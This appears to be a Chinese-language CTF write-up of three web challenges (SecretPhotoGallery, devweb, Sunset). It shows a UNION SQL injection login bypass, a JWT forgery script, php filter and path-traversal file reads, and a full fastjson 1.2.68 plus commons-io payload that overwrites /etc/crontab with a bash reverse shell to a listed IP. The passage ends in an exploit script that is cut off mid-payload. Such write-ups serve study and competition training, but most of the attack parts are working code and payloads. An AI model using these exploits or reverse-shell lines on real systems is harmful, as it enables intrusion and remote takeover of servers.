# WEB
## 题目-SecretPhotoGallery
### 题目信息
| ### 题目名 | ### 类型 | ### 难度 |
| :---: | :---: | :---: |
| ### SecretPhotoGallery | ### WEB | ### 简单 |


### FLAG
+ 动态 flag

### 知识点
1. SQL注入基础
2. JWT 伪造与签名
3. 任意文件读取漏洞

### 解题步骤
尝试常规SQL注入 `' OR '1'='1` 失败，因为数据库是空的。

使用UNION注入：

```plain
Username: admin' UNION SELECT 1,'admin','password' FROM sqlite_master--
Password: anything
```

成功登录！



登录后，打开浏览器开发者工具，查看 Cookies，发现有一个 `auth_token`：

```plain
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3MzI1ODg4MDB9.xxxxxxxxxxxxxxxxxxxxx
```

这是一个JWT token！使用 [jwt.io](https://jwt.io) 解码：

**Header:**

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

**Payload:**

```json
{
  "user": "admin",
  "role": "guest",
  "iat": 1732588800
}
```

**关键发现**：我们的角色是 `guest`，但可能需要 `admin` 权限！

相册页面显示了17张照片，提示：

仔细观察每张照片的 Photo ID：

```plain
Photo 1:  G1001  | File: mountain_view.jpg
Photo 2:  A2002  | File: spring_garden.jpg
Photo 3:  L3003  | File: lazy_cat.jpg
Photo 4:  L4004  | File: beach_life.jpg
Photo 5:  E5005  | File: evening_stars.jpg
Photo 6:  R6006  | File: river_forest.jpg
Photo 7:  Y7007  | File: city_youth.jpg
Photo 8:  28008  | File: peak_2k.jpg
Photo 9:  09009  | File: lake_0deg.jpg
Photo 10: 210010 | File: trail_2miles.jpg
Photo 11: 411011 | File: wild_4x4.jpg
Photo 12: S12012 | File: sunset_sky.jpg
Photo 13: E13013 | File: pier_edge.jpg
Photo 14: C14014 | File: country_crops.jpg
Photo 15: R15015 | File: rural_ranch.jpg
Photo 16: E16016 | File: tech_era.jpg
Photo 17: T17017 | File: summit_top.jpg
```

提取每个Photo ID的第一个字符：

```plain
G-A-L-L-E-R-Y-2-0-2-4-S-E-C-R-E-T
```

组合起来就是：**GALLERY2024SECRET**

这就是JWT的签名密钥



现在我们有了：

+ JWT密钥：`GALLERY2024SECRET`
+ 当前payload：`{"user":"admin","role":"guest","iat":1732588800}`

需要修改 `role` 为 `admin` 并重新签名。

**方法1：使用在线工具 jwt.io**

1. 访问 [https://jwt.io](https://jwt.io)
2. 粘贴你的JWT token
3. 在 "VERIFY SIGNATURE" 部分输入密钥：`GALLERY2024SECRET`
4. 修改 Payload 中的 `role` 为 `admin`
5. 复制生成的新JWT token

**方法2：使用Python脚本**

```python
import hmac
import hashlib
import base64
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def create_jwt(payload, secret):
    header = {"typ": "JWT", "alg": "HS256"}

    header_encoded = base64url_encode(json.dumps(header).encode())
    payload_encoded = base64url_encode(json.dumps(payload).encode())

    message = f"{header_encoded}.{payload_encoded}"
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    signature_encoded = base64url_encode(signature)

    return f"{message}.{signature_encoded}"

# 创建admin JWT
payload = {
    "user": "admin",
    "role": "admin",  # 修改为admin
    "iat": 1732588800
}

jwt_token = create_jwt(payload, "GALLERY2024SECRET")
print(f"Forged JWT: {jwt_token}")
```

### 
1. 打开浏览器开发者工具 (F12)
2. 进入 Application/Storage → Cookies
3. 找到 `auth_token`，将值替换为伪造的JWT token
4. 刷新页面或访问 `/admin.php`

成功进入Admin面板！

Admin面板提供了"File Export Tool"功能，可以读取服务器文件。



`base64` 和 `rot13` 被过滤了，但是还有其他PHP filter可以用！

使用 `convert.iconv` 进行字符编码转换：

```plain
php://filter/convert.iconv.utf-8.utf-7/resource=flag.php
```

## 题目-devweb
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| devweb | WEB | 中等 |


### FLAG
+ 动态FLAG

### 知识点
1. js分析
2. rsa加密
3. jmx分析
4. 签名伪造
5. 任意文件下载

### 解题步骤
1. 分析打包后的js还原路由和参数<img src="https://c.img.dasctf.com/LightPicture/2024/10/c29e9928a441fe81.jpg" width="2554" title="null" crop="0,0,1,1" id="mcoI9" class="ne-image">
2. 发现js源码中登录是通过rsa加密传输密码的，于是根据被注释的公钥自加密生成数据包<img src="https://c.img.dasctf.com/LightPicture/2024/10/e76eee0cde3137c1.jpg" width="2082" title="null" crop="0,0,1,1" id="i2xXF" class="ne-image">
3. 把数据包中表单localhost的请求换成服务器的地址，尝试弱口令获取登录的权限<img src="https://c.img.dasctf.com/LightPicture/2024/10/cfab39e015bfd9d6.jpg" width="1819" title="null" crop="0,0,1,1" id="eV9hV" class="ne-image">

```plain
POST /login HTTP/1.1
Host: 
Content-Length: 540
sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin&password=%57%65%41%5a%6a%76%35%43%79%79%32%75%49%78%77%52%33%4a%35%66%32%73%36%71%6d%75%4f%78%71%52%4a%38%54%66%74%4f%34%31%74%39%51%44%44%4a%70%68%34%63%78%2b%78%71%47%54%31%5a%48%36%58%47%50%7a%64%54%57%51%4b%34%79%78%50%58%65%61%65%72%4d%50%34%57%70%74%41%51%36%67%58%76%42%36%34%52%52%48%64%4b%72%43%33%4d%77%7a%34%36%54%59%2b%75%31%61%4f%39%46%51%79%56%34%48%58%4f%6d%6d%6a%30%75%52%37%42%58%6b%53%4a%63%62%6c%68%62%45%59%2b%32%41%33%50%61%6e%30%65%57%5a%2f%66%63%54%74%50%39%49%78%7a%4d%69%46%6d%2f%33%46%38%65%7a%67%3d
```

4. 之后可以访问js中的另一个/download路由，根据源码发现存在 app.jmx测试文件<img src="https://c.img.dasctf.com/LightPicture/2024/10/feb868a52b2d6b53.jpg" width="2559" title="null" crop="0,0,1,1" id="Iy44c" class="ne-image">
5. 带上cookie下载文件<img src="https://c.img.dasctf.com/LightPicture/2024/10/9ba2b92e66dbf33a.jpg" width="1810" title="null" crop="0,0,1,1" id="LKnO2" class="ne-image">

```plain
GET /download?file=app.jmx&sign=6f742c2e79030435b7edc1d79b8678f6 HTTP/1.1
Host: 
sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
Cookie: JSESSIONID=EB1EF248D42758C46027CB3F673053EE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

6. 分析app.jmx发现下载需要加盐的md5签名，根据jmx中的加密代码生成签名下载根目录flag<img src="https://c.img.dasctf.com/LightPicture/2024/10/7f2e12b3535b8163.jpg" width="2290" title="null" crop="0,0,1,1" id="RuesW" class="ne-image"><img src="https://c.img.dasctf.com/LightPicture/2024/10/1133b01b7aa210cf.jpg" width="1819" title="null" crop="0,0,1,1" id="Xi8jM" class="ne-image">



```plain
GET /download?file=../../../../flag&sign=720160b91d9821ad52a0bcf520cc4fce HTTP/1.1
Host: 118.31.164.133:8080
sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
Cookie: JSESSIONID=EB1EF248D42758C46027CB3F673053EE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

## 题目-Sunset
### 题目信息
| **题目名** | **类型** | **难度** |
| --- | --- | --- |
| **Sunset** | **WEB** | **困难** |


### FLAG
DASCTF{f4806d88-0567-4938-82ed-4ba9e1a66c9f}

### 知识点
1. fastjson以及common-io黑盒测试
2. fastjson1.2.68结合common-io任意文件写入
3. crontab覆盖计划任务反弹shell

### 解题步骤
1. 黑盒测试查看fastjson版本
2. fastjson1.2.68测试是否存在common-io
3. 通过common-io写入任意内容的计划任务
4. 反弹shell

拿到题目以后，弱口令进行登录，进去有一个重置密码功能，进行密码重置进行抓包，可以发现是json传参：

<img src="https://c.img.dasctf.com/LightPicture/2024/10/3108b7e542314088.png" width="1631" title="null" crop="0,0,1,1" id="wQRfe" class="ne-image">

因为是java站，所以猜测有fastjson服务，查看一下是否存在fastjson漏洞，这里我们通过报错来查看fastjson版本：

```plain
{
  "@type": "java.lang.AutoCloseable"
```

<img src="https://c.img.dasctf.com/LightPicture/2024/10/2ad9b5868fce58c5.png" width="1852" title="null" crop="0,0,1,1" id="tASvk" class="ne-image">

fastjson1.2.68可以结合commons-io写文件，查看一下是否存在commons-io：

```json
{
  "x": {
    "@type": "java.lang.Character"{
  "@type": "java.lang.Class",
  "val": "org.apache.commons.io.Charsets"
}}
```

<img src="https://c.img.dasctf.com/LightPicture/2024/10/363f4837c05243f7.png" width="1865" title="null" crop="0,0,1,1" id="RFVN7" class="ne-image">

可以通过fastjson1.2.68+commons-io组合拳打任意文件写入，因为不知道flag文件名这里没法直接通过测信道读取flag，这个地方是通过jar包启动的服务，无法通过写jsp文件，而且后端都是进行过滤了的，所以写文件我们可以通过覆盖计划任务的方式反弹shell：

在我们构造反弹shell的时候要注意，计划任务必须单独为一行，否则会报错，所以垃圾字符前要接换行符和注释，同时在commons-io2.x文件写入中，规定了写入文件的长度，写入内容的长度必须要>8192，但实际写入的内容只有前8192个字符，后面的不会写入

```plain
* * * * * root bash -c 'bash -i >& /dev/tcp/ip/port 0>&1' \n
#aaaaaaaaaa……
```

payload:

```json
{
  "x": {
    "@type": "com.alibaba.fastjson.JSONObject",
    "input": {
      "@type": "java.lang.AutoCloseable",
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {
          "@type": "java.lang.String""* * * * * root bash -c 'bash -i >& /dev/tcp/47.98.247.113/9999 0>&1' 
#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },
      "branch": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.output.WriterOutputStream",
        "writer": {
          "@type": "org.apache.commons.io.output.FileWriterWithEncoding",
          "file": "/etc/crontab",
          "encoding": "UTF-8",
          "append": false
        },
        "charsetName": "UTF-8",
        "bufferSize": 1024,
        "writeImmediately": true
      },
      "trigger": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.XmlStreamReader",
        "is": {
          "@type": "org.apache.commons.io.input.TeeInputStream",
          "input": {
            "$ref": "$.input"
          },
          "branch": {
            "$ref": "$.branch"
          },
          "closeBranch": true
        },
        "httpContentType": "text/xml",
        "lenient": false,
        "defaultEncoding": "UTF-8"
      },
      "trigger2": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.XmlStreamReader",
        "is": {
          "@type": "org.apache.commons.io.input.TeeInputStream",
          "input": {
            "$ref": "$.input"
          },
          "branch": {
            "$ref": "$.branch"
          },
          "closeBranch": true
        },
        "httpContentType": "text/xml",
        "lenient": false,
        "defaultEncoding": "UTF-8"
      },
      "trigger3": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.XmlStreamReader",
        "is": {
          "@type": "org.apache.commons.io.input.TeeInputStream",
          "input": {
            "$ref": "$.input"
          },
          "branch": {
            "$ref": "$.branch"
          },
          "closeBranch": true
        },
        "httpContentType": "text/xml",
        "lenient": false,
        "defaultEncoding": "UTF-8"
      }
    }
  }
}
```

稍等片刻以后，收到shell，其中我们可以发现crontab中的内容我们已经写进去了:

<img src="https://c.img.dasctf.com/LightPicture/2024/10/c2679a4a918cda88.png" width="1859" title="null" crop="0,0,1,1" id="dvf1B" class="ne-image">

之后直接cat /f*获取flag即可

### EXP
```python
import sys
import requests
import re

HOST = sys.argv[1]
PORT = sys.argv[2]
# FLAG = sys.argv[3]
def exp(ip,port):
    exp_url = "http://%s:%s/admin/resetPassword"% (ip, port)
    cmd = "bash -c 'bash -i >& /dev/tcp/47.98.247.113/2333 0>&1'"
    exp_headers = {"Content-Type": "application/json; charset=UTF-8"}
    exp_data = '''{
  "x": {
    "@type": "com.alibaba.fastjson.JSONObject",
    "input": {
      "@type": "java.lang.AutoCloseable",
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {
          "@type": "java.lang.String""* * * * * root bash -c 'bash -i >& /dev/tcp/47.98.247.113/9999 0>&1' 
